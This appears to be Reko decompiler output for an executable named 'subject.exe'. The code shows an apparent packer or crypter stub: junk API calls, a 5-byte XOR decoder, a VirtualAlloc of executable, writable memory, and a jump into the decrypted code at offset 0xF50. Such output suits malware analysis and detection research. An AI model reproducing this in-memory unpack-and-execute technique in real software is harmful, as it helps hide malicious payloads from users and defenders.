// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 1310E000: Register word32 fn1310E000(Stack (ptr32 byte) dwArg04, Stack word32 dwArg08, Stack word32 dwArg0C, Stack (ptr32 word32) dwArg10, Stack word32 dwArg14, Stack int32 dwArg18)
word32 fn1310E000(byte * dwArg04, word32 dwArg08, word32 dwArg0C, word32 * dwArg10, word32 dwArg14, int32 dwArg18)
{
	*dwArg10 = dwArg0C;
	word16 wLoc10_104 = (word16) (uint32) ((uint64) (uint32) dwArg14 % 0x05);
	byte * dwArg08_28 = dwArg08 + dwArg14;
	while (true)
	{
		dwArg0C = dwArg0C - 0x01;
		if (dwArg0C == 0x00)
			break;
		*dwArg04 = (byte) ((int32) *dwArg08_28 ^ (word32) (*((word32) ((int32) wLoc10_104) + dwArg18)));
		word16 cx_83 = wLoc10_104 + 0x01;
		wLoc10_104 = cx_83;
		if ((int32) cx_83 == 0x05)
			wLoc10_104 = 0x00;
		dwArg04 = dwArg04 + 0x01;
		dwArg08_28 = dwArg08_28 + 0x01;
	}
	return dwArg0C;
}

// 1310E09B: Register word32 fn1310E09B(Register ptr32 ebp)
word32 fn1310E09B(ptr32 ebp)
{
	SetErrorMode(0x5C000000);
	word32 esp_26;
	word32 ebp_27;
	byte SCZO_28;
	word32 eax_29;
	word32 edi_30;
	word32 ecx_31;
	byte SZO_32;
	bool C_33;
	word32 edx_34;
	bool Z_35;
	word32 esi_36;
	word32 ebx_37;
	byte dl_38;
	ADVAPI32.dll!WmiReceiveNotificationsA();
	GetStartupInfoA(fp - 660);
	ptr32 esp_67;
	word32 ebp_68;
	byte SCZO_69;
	word32 eax_70;
	word32 edi_71;
	word32 ecx_72;
	byte SZO_73;
	bool C_74;
	word32 edx_75;
	bool Z_76;
	word32 esi_77;
	word32 ebx_78;
	byte dl_79;
	ADVAPI32.dll!WmiSetSingleInstanceW();
	HRESULT eax_49 = SafeArrayGetUBound(null, 0x0006C000, (LONG *) 0x00012C00);
	if (edx_75 != 0x03EC0000 && eax_70 + 0x80040199 == eax_49 + ~0x0002FE66)
	{
		word32 ebx_325 = *((word32) eax_49 - 1828067671);
		*(esp_67 - 0x04) = fp - 0x0234;
		*(esp_67 - 0x08) = 0x00;
		*(esp_67 - 0x0C) = fp - 0x10;
		*(esp_67 - 0x10) = 0x04;
		*(esp_67 - 0x14) = fp - 0x023C;
		*(esp_67 - 0x18) = fp - 0x023C;
		fn1310E000(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
		Eq_166 edi_350 = *((word32) eax_49 - 1828067667);
		*(esp_67 - 0x04) = fp - 0x0234;
		*(esp_67 - 0x08) = 0x04;
		*(esp_67 - 0x0C) = fp - 0x10;
		*(esp_67 - 0x10) = 0x04;
		*(esp_67 - 0x14) = fp - 0x025C;
		*(esp_67 - 0x18) = fp - 600;
		fn1310E000(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
		Eq_212 edi_373 = *((word32) eax_49 - 0x6CF6194F);
		*(esp_67 - 0x04) = fp - 0x0234;
		*(esp_67 - 0x08) = 0x08;
		*(esp_67 - 0x0C) = fp - 0x10;
		*(esp_67 - 0x10) = 0x04;
		*(esp_67 - 0x14) = fp - 0x1C;
		*(esp_67 - 0x18) = fp - 0x14;
		fn1310E000(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
		*(esp_67 - 0x04) = 0x00;
		Eq_264 eax_400 = GetModuleHandleA(*(esp_67 - 0x04));
		Eq_273 eax_408 = *((word32) eax_49 - 0x6CF6194B);
		*(esp_67 - 0x04) = fp - 0x0234;
		*(esp_67 - 0x08) = 0x0C;
		*(esp_67 - 0x0C) = fp - 0x10;
		*(esp_67 - 0x10) = 0x04;
		*(esp_67 - 0x14) = fp - 0x28;
		*(esp_67 - 0x18) = fp - 0x1C;
		fn1310E000(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
		dwLoc0248 = (Eq_321) *((word32) eax_49 - 1828067655);
		*(esp_67 - 0x04) = fp - 0x0234;
		*(esp_67 - 0x08) = 0x10;
		*(esp_67 - 0x0C) = fp - 0x10;
		*(esp_67 - 0x10) = 0x04;
		*(esp_67 - 0x14) = fp - 600;
		*(esp_67 - 0x18) = fp - 0x0248;
		fn1310E000(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
		*(esp_67 - 0x04) = 0x40;
		*(esp_67 - 0x08) = 0x3000;
		Eq_321 eax_471 = edi_373 * 0x08 + 0x0C;
		Mem481[esp_67 - 0x0C + 0x00:word32] = eax_471 + edi_350 + ebx_325;
		*(esp_67 - 0x10) = 0x00;
		dwLoc023C = ebx_325;
		dwLoc0258 = edi_350;
		dwLoc14 = edi_373;
		dwLoc20 = eax_400;
		dwLoc024C = 0x14;
		dwLoc24 = eax_49 + 2466899645;
		dwLoc2C = eax_471;
		dwLoc0260 = VirtualAlloc(*(esp_67 - 0x10), *(esp_67 - 0x0C), *(esp_67 - 0x08), *(esp_67 - 0x04));
		dwLoc0C = eax_408 + eax_400 + eax_471;
		dwLoc0264 = eax_471;
		dwLoc08 = (Eq_212) 0x00;
		dwLoc18 = 0x00;
	}
	while (0x01 != 0x00)
	{
		if (dwLoc0264 == dwLoc0248)
		{
			Eq_212 edx_243 = (word32) dwLoc08.dw0000 + 0x01;
			dwLoc08 = edx_243;
			if (edx_243 == dwLoc14)
				break;
			Eq_542 edx_249 = *((char *) &dwLoc24->t9309E6B9.t0000.t0000 + 1828067655);
			*(esp_67 - 0x04) = fp - 0x0234;
			*(esp_67 - 0x08) = dwLoc024C;
			*(esp_67 - 0x0C) = fp - 0x10;
			*(esp_67 - 0x10) = 0x04;
			*(esp_67 - 0x14) = fp - 0x1C - dwLoc024C;
			*(esp_67 - 0x18) = fp - 0x1C;
			fn1310E000(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
			word32 esi_279 = dwLoc24 + 0x04;
			dwLoc0248 = (Eq_321) esi_279->t0000.t0000;
			*(esp_67 - 0x04) = fp - 0x0234;
			ui32 ebx_276 = dwLoc024C + 0x04;
			*(esp_67 - 0x08) = ebx_276;
			*(esp_67 - 0x0C) = fp - 0x10;
			*(esp_67 - 0x10) = 0x04;
			*(esp_67 - 0x14) = fp - 0x0248 - ebx_276;
			*(esp_67 - 0x18) = fp - 0x0248;
			fn1310E000(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
			dwLoc024C = ebx_276 + 0x04;
			dwLoc24 = esi_279 + 0x04;
			dwLoc0264 = (Eq_321) 0x00;
			dwLoc0C = edx_249 + dwLoc20;
		}
		*((char *) dwLoc0260 + dwLoc18) = (Eq_407) dwLoc0C.t0000->unused;
		dwLoc0C = dwLoc0C + 0x01;
		dwLoc18 = dwLoc18 + 0x01;
		dwLoc0264 = dwLoc0264 + 0x01;
	}
	*(esp_67 - 0x04) = fp - 0x0234;
	(esp_67 - 0x08)->t0000.t0000 = dwLoc2C;
	*(esp_67 - 0x0C) = fp - 0x0238;
	(esp_67 - 0x10)->t0000 = (LPVOID) dwLoc0258;
	*(esp_67 - 0x14) = (LPVOID *) (dwLoc0260 - dwLoc2C);
	*(esp_67 - 0x18) = (LPVOID *) dwLoc0260;
	word32 eax_164 = fn1310E000(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
	*(esp_67 - 0x04) = fp;
	*(esp_67 - 0x08) = fp - 0x0234;
	(esp_67 - 0x0C)->t0000 = (LPVOID) dwLoc0258;
	*(esp_67 - 0x10) = dwLoc023C;
	*(esp_67 - 0x14) = (LPVOID *) dwLoc0260;
	word32 esi_187 = dwLoc0260 + dwLoc0258;
	*(esp_67 - 0x18) = (LPVOID *) esi_187;
	word32 esp_191;
	word32 ebp_192;
	byte SCZO_193;
	word32 eax_194;
	word32 edi_195;
	word32 ecx_196;
	byte SZO_197;
	bool C_198;
	word32 edx_199;
	bool Z_200;
	word32 esi_201;
	word32 ebx_202;
	byte dl_203;
	(dwLoc0260 + 0x0F50)();
	return eax_194;
}

// 1310E4E5: Register Eq_409 Win32CrtStartup()
DWORD Win32CrtStartup()
{
	fs->ptr0000 = fp - 0x14;
	__set_app_type(0x02);
	*__p__fmode() = 0x00;
	*__p__commode() = 0x00;
	int32 eax_45 = *adjust_fdiv;
	fn1310E63E();
	if (eax_45 == 0x00)
		__setusermatherr((int32 (*)(struct _exception *)) 0x0DA00000);
	fn1310E629();
	_initterm(fp - 0x80, fp - 0x80);
	__getmainargs(fp - 100, fp - 116, fp - 0x68, eax_45);
	_initterm(fp - 0x80, fp - 0x80);
	cu8 * esi_132 = *acmdln;
	if (*esi_132 == 0x22)
	{
		do
		{
			esi_132 = esi_132 + 0x01;
			cu8 al_145 = *esi_132;
		} while (al_145 != 0x00 && al_145 != 0x22);
		if (*esi_132 == 0x22)
		{
l1310E5AA:
			esi_132 = esi_132 + 0x01;
		}
	}
	else
	{
		while (*esi_132 > 0x20)
			esi_132 = esi_132 + 0x01;
	}
	cu8 al_89 = *esi_132;
	if (al_89 == 0x00 || al_89 > 0x20)
	{
		GetStartupInfoA(fp - 0x60);
		GetModuleHandleA(null);
		exit(fn1310E09B(fp - 0x04));
	}
	goto l1310E5AA;
}

// 1310E629: void fn1310E629()
void fn1310E629()
{
	_controlfp(0x00010000, 0x00030000);
}

// 1310E63E: void fn1310E63E()
void fn1310E63E()
{
}

